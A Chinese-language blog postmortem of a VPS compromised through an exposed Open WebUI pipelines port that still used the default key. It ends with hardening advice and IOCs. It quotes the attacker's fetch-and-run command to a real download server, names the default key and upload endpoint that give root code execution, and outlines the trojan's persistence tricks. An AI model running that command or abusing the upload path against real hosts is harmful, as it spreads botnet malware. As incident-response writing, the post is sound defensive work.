---
author: "Shumin Fu"
pubDatetime: 2026-10-20T22:58:35-04:00
title: "一台 VPS 两天跑掉 500GB：Open WebUI pipelines 被植入 DDoS 僵尸网复盘"
slug: vps-pipelines-ddos-botnet-incident
featured: false
draft: false
tags:
  - "ai-agents"
  - "security"
  - "incident-response"
  - "self-hosting"
description: "Open WebUI pipelines 端口对公网开放且用默认 key，被植入 Spider DDoS 木马，两天发出近 500GB 流量；记录结论、排查、根因、修复和教训。"
---

<style>
.html-embed{overflow-x:auto;max-width:100%}  /* a too-wide table scrolls inside the post, not the page */
.callout{border-left:2px solid var(--accent);padding-left:1rem;margin:1rem 0}
td.num,th.num{text-align:right;font-variant-numeric:tabular-nums}
tr.hl td{font-weight:600}
.hash{word-break:break-all}
ol.tl{list-style:none;padding-left:1rem;border-left:2px solid var(--accent)}
ol.tl li{margin:.6rem 0}
ol.tl .t{display:block;font-size:.85em;color:var(--accent);font-variant-numeric:tabular-nums}
ul.check li::marker{content:"✓  ";color:var(--accent)}
</style>

<div class="html-embed" lang="zh">
<div class="callout"><b>结论先说</b>：这本质上是对开源项目的信任问题——别把项目的默认配置（默认 key、默认绑定 <code>0.0.0.0</code>）原样跑在公网上。默认值写在公开 README 里，扫描器早就内置了。<br>
<b>马上自查</b>：如果你也在跑 Open WebUI pipelines，现在就执行 <code>ss -ltnp | grep 9099</code>，看它是不是监听在 <code>0.0.0.0</code>；再确认 key 不是默认的 <code>0p3n-w3bu!</code>。</div>
<p>我一台 VPS 的 pipelines 端口对公网开着，用的还是默认 key，结果被人塞进一个 DDoS 木马，两天就把一个月的流量额度打光了。下面是排查经过、根因和修复清单。</p>
<h2>症状：流量费突然涨了</h2>
<p>机器带宽 15Mbps，每月 500GB 流量。10 月 20 日晚上我发现它连不上了。服务商面板上的流量是这样的：</p>
<table>
<thead><tr><th>日期</th><th class="num">发送</th><th class="num">接收</th></tr></thead>
<tbody>
<tr><td>第 0 天</td><td class="num">约 1.5GB（合计）</td><td class="num">—</td></tr>
<tr class="hl"><td>第 1 天</td><td class="num">约 188GB</td><td class="num">很少</td></tr>
<tr class="hl"><td>第 2 天</td><td class="num">307.68GB</td><td class="num">0.04GB</td></tr>
</tbody></table>
<p>当月 500GB 额度用完后，服务商直接停了机。我另买了一个 200GB 流量包，机器才重新开起来。</p>
<h2>第一轮排查：什么都没看到</h2>
<p>我让 AI 助手通过 SSH 登上去查。第一轮结果是"看不出流量去了哪"：</p>
<ul>
<li>机器上从没装过 vnstat 这类流量统计，没有按天、按小时的数据。</li>
<li>代理服务的访问日志是关的。</li>
<li>nginx 每天只发出去 2MB 左右，邮件服务一封外发都没有。</li>
<li>机器停机重启后，网卡计数器清零了，实时状态非常干净。</li>
</ul>
<p>唯一的线索是系统日志在 17:22（美东时间）戛然而止，没有任何关机记录，22:08 才重新开机。后来查到，这正是额度用完被停机的时刻。</p>
<h2>关键转折：流量是单向的</h2>
<p>一开始我怀疑代理配置泄露、被别人拿去用。但面板上的数字否掉了这个猜测：代理转发流量，收进来多少就发出去多少，收发应该差不多对等。307GB 发、0.04GB 收，说明是这台机器自己在往外打包，最常见的就是被当成肉鸡发 DDoS。</p>
<p>顺着这个方向再看内核日志：从 20 日 14:40（美东）开始，内核不断报 <code>nf_conntrack: table full, dropping packet</code>。连接跟踪表被撑满，正是大量外发连接的典型迹象。</p>
<p>还有个数字对不上：15Mbps 一天最多发约 160GB，307GB 要持续 28Mbps 左右。估计是线路实际限速比标称宽松。</p>
<h2>根因：pipelines 端口 + 默认 key = 远程 root 执行</h2>
<p>机器上跑着 Open WebUI 和它配套的 <a href="https://github.com/open-webui/pipelines">pipelines</a> 服务。pipelines 的 9099 端口通过 <code>docker -p 9099:9099</code> 发布到了 <code>0.0.0.0</code>，API key 还是项目公开的默认值 <code>0p3n-w3bu!</code>。</p>
<p>pipelines 有个接口 <code>POST /v1/pipelines/upload</code>，上传一个 Python 文件，它会立刻 import 执行。容器内是 root。所以知道默认 key 的任何人，都能在这个容器里以 root 跑任意代码。</p>
<div class="callout">注意：<code>docker -p</code> 发布的端口会直接写 iptables 规则，绕过 ufw。你以为防火墙挡住了，其实没有。</div>
<h3>攻击过程</h3>
<ol>
<li>攻击者从 <code>94.154.43.7</code> 向 9099 上传 Python 脚本，前后 4 次。每次上传后约 5 秒再调用删除接口，把 pipeline 删掉。</li>
<li>脚本里是一段 base64 编码的命令：把 curl / wget 复制到隐藏目录 <code>/tmp/.ppb</code>，再执行 <code>curl http://176.65.149.82:48180/boot | sh</code>。</li>
<li>第二阶段脚本把木马装成 <code>/usr/bin/kworker</code>，冒充内核线程名。</li>
<li>持久化三件套：<code>/etc/cron.d</code> 每 5 分钟拉起一次、<code>/etc/init.d</code> 的 S99 开机脚本、<code>/etc/profile.d</code> 登录钩子。</li>
<li>最后把真正的 <code>curl</code> 和 <code>chattr</code> 改成 <code>chmod 000</code>，防止别人用它们下载清理工具或解除文件锁。</li>
</ol>
<h3>木马本身</h3>
<p>样本是一个 396KB 的静态链接 x86-64 程序，环境变量里带 <code>SPIDER_NAME=psiphon</code>，属于叫 Spider 的 DDoS 僵尸网络家族。拆开能看到的能力：</p>
<ul>
<li>HTTP / HTTP2 洪水</li>
<li>SIP / UDP 洪水</li>
<li>TCP SYN、ACK、PSH 洪水</li>
<li>远程 shell</li>
<li>带宽测试（大概用来给僵尸网络里的机器"测速定价"）</li>
</ul>
<p>它没有挖矿、没有窃密模块，主要就是拿我的带宽去打别人。</p>
<h3>证据从哪来</h3>
<p>攻击者删了上传的脚本，但留下了两样东西：</p>
<ul>
<li><b><code>__pycache__</code> 残留</b>：Python import 时生成的 <code>.pyc</code> 没被删，反编译就能还原脚本内容。</li>
<li><b>容器日志</b>：pipelines 打印了每次上传、加载、删除，以及执行时的 <code>uid=0</code> 输出。</li>
</ul>
<p>翻容器日志还发现，这个端口从几个月前起就陆续有人来试，不止一伙：有直接用公开 PoC 脚本的，也有把恶意代码起名叫 <code>legit_pipeline.py</code> 的。只是之前那几次没留下持续运行的东西，这次的 Spider 才把流量打爆。</p>
<h2>时间线（美东时间 EDT）</h2>
<ol class="tl">
<li><span class="t">数月前起</span>9099 端口陆续被多个来源尝试利用。</li>
<li><span class="t">10-19 08:36 – 09:47</span><code>94.154.43.7</code> 上传并删除恶意 pipeline 共 4 次。</li>
<li><span class="t">10-19 09:47</span>Spider 木马落地为 <code>/usr/bin/kworker</code>，出站流量开始暴涨。</li>
<li><span class="t">10-20 14:40</span>内核开始报 <code>nf_conntrack: table full</code>。</li>
<li><span class="t">10-20 17:22</span>月度 500GB 额度耗尽，服务商停机。</li>
<li><span class="t">10-20 22:08</span>我买了 200GB 流量包，机器重新开机。重启后容器只启动了服务本身，木马的 cron 没被执行，所以没再跑起来。</li>
<li><span class="t">10-21</span>排查定位、留证、清理、加固。</li>
</ol>
<h2>影响评估</h2>
<ul>
<li><b>没有逃逸到主机</b>：容器不是 privileged，没挂 <code>docker.sock</code>。主机上没有新增 SSH key，几个月来也没有成功的密码登录。</li>
<li><b>没有泄露密钥</b>：pipelines 容器里没存任何 API key。环境变量里的 <code>GPG_KEY</code> 是 Python 官方镜像自带的公开签名公钥 ID，不是秘密。</li>
<li><b>没有横向移动</b>：其他服务在别的 Docker 网络里；Open WebUI 也没收到过来自 pipelines 容器的异常请求。</li>
<li><b>附带发现</b>：Open WebUI 开着公开注册，攒了 119 个待审核的陌生账号，有随机邮箱，也有 <code>attacker@evil.com</code> 这种扫描器账号，还有本次攻击者的 IP。都没被批准，没有任何权限。</li>
</ul>
<p>真正的损失是流量费，以及我的机器被拿去打了别人两天。</p>
<h2>修复</h2>
<ol>
<li><b>留证据</b>：先 <code>docker export</code> 导出整个容器文件系统，连同日志一起存档，再动手清理。</li>
<li><b>停服务</b>：pipelines 容器删掉、用干净镜像重建后，我觉得 Open WebUI 也用不上了，干脆整个 <code>docker compose down</code>，数据留着。</li>
<li><b>收端口</b>：9099 改绑 <code>127.0.0.1</code>，换成 64 位随机 key。</li>
<li><b>Postgres 5432</b>：之前也发布在 <code>0.0.0.0</code>，而且根本没服务在用。在 <code>DOCKER-USER</code> 链里加规则挡掉外网访问（这条链 Docker 不会覆盖）。</li>
<li><b>代理端口</b>：发现另一个代理端口是个开着 <code>allow-lan: true</code>、不要密码的公开代理，改成 <code>allow-lan: false</code>。</li>
<li><b>可观测性</b>：装上 vnstat 和 sysstat，打开代理访问日志。下次流量再异常，至少能知道是哪个时段、哪个连接。</li>
</ol>
<h2>教训清单</h2>
<ul class="check">
<li>能执行代码的、管理后台、数据库端口，永远不要发布到 <code>0.0.0.0</code>。<code>-p 127.0.0.1:9099:9099</code> 多打几个字而已。</li>
<li>项目自带的默认 key / 密码，部署第一件事就换掉。它们写在公开 README 里，扫描器早就内置了。</li>
<li><code>docker -p</code> 绕过 ufw。要限制，写到 <code>DOCKER-USER</code> 链。</li>
<li>机器上要有流量统计，服务商那边要开额度告警。这次我是看到账单才知道。</li>
<li>出了问题先查服务商面板或 API。按天的收发数据一眼就能看出方向，比在机器上翻日志快得多。</li>
<li>出站远大于入站，基本就是机器在往外打流量，先找外发进程，别先怀疑代理被蹭。</li>
</ul>
<h2>IOC</h2>
<table>
<thead><tr><th>类型</th><th>值</th></tr></thead>
<tbody>
<tr><td>攻击来源 / 上传</td><td><code>94.154.43.7</code></td></tr>
<tr><td>下载服务器</td><td><code>176.65.149.82:48180</code>（<code>/boot</code>）</td></tr>
<tr><td>相关 IP（注册扫描）</td><td><code>176.65.149.237</code></td></tr>
<tr><td>相关 IP</td><td><code>43.156.213.200</code></td></tr>
<tr><td>样本 SHA-256</td><td><code class="hash">2f257346ddbdd3271133552f67427f8fe11fd0509b86ced4d665d72aa39b4887</code></td></tr>
<tr><td>落地路径</td><td><code>/usr/bin/kworker</code>、<code>/tmp/.ppb</code></td></tr>
<tr><td>标记</td><td><code>SPIDER_NAME=psiphon</code></td></tr>
</tbody></table>
<p>如果你也在跑 Open WebUI pipelines，可以现在就检查一下：<code>ss -ltnp | grep 9099</code>，看它是不是监听在 <code>0.0.0.0</code>；再确认 key 不是 <code>0p3n-w3bu!</code>。</p>
</div>
